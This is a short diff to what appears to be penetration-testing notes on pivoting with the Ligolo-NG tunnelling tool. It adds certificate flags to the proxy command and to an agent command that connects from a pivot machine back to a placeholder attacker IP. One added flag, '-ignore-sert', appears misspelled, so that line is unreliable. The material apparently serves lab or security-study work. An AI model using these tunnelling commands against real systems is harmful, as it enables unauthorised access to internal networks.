@@ -26,11 +26,11 @@
   ```
 * Start Ligolo-NG
   ```bash
-  ligolo-ng-proxy
+  ligolo-ng-proxy -selfcert
   ```
 * Run the agent on the pivot machine
   ```bash
-  agent -connect <attacker IP:11601>
+  agent -connect <attacker IP:11601> -ignore-sert
   ```
   - Should see agent joined on the attacker machine
 * Select Agent on Attacker machine
